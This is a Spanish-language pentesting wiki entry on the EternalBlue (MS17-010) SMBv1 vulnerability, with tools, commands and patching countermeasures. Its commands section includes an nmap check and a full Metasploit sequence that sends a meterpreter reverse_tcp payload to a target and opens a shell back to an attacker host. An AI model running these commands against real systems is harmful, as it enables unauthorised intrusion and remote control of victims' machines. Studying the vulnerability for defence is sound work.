# EternalBlue (MS17-010)

## Descripción
Vulnerabilidad crítica en el protocolo SMBv1 de Windows que permite la ejecución remota de código (RCE) sin autenticación mediante paquetes especialmente diseñados. Fue utilizada masivamente en ataques como WannaCry y NotPetya.

## Clasificación
- **Fase**: Explotación
- **MITRE ATT&CK**: T1210 (Exploitation of Remote Services)
- **Plataforma**: Windows
- **Dificultad**: Intermedia

## Herramientas
- **Metasploit Framework** (`exploit/windows/smb/ms17_010_eternalblue`) — framework principal para la explotación automatizada.
- **nmap** (`--script smb-vuln-ms17-010`) — utilizado para detectar si un host es vulnerable antes de intentar la explotación.
- **AutoBlue-MS17-010** — scripts de Python para explotación manual sin depender de Metasploit.

## Comandos / Ejemplos

### Verificación con Nmap
```bash
# Escanear un objetivo en busca de MS17-010
nmap -p 445 --script smb-vuln-ms17-010 <target-ip>
# Resultado: State: VULNERABLE si es susceptible al ataque
```

### Explotación con Metasploit
```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-ip>
set LHOST <attacker-ip>
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

### Explotación manual (Checker)
```bash
# Verificar vulnerabilidad con el script de AutoBlue
python3 eternal_checker.py <target-ip>
```

## Contramedidas
- Aplicar el parche de seguridad MS17-010 de Microsoft.
- Deshabilitar SMBv1 en todos los sistemas y forzar el uso de SMBv2 o SMBv3.
- Bloquear el puerto 445 en el firewall perimetral y restringir el acceso interno.
- Implementar segmentación de red para limitar el movimiento lateral.

## Referencias
- Rahalkar, S. (2017). *Metasploit for Beginners*. Packt Publishing.
- MITRE Corporation. (2024). ATT&CK Technique T1210: Exploitation of Remote Services. https://attack.mitre.org/techniques/T1210/
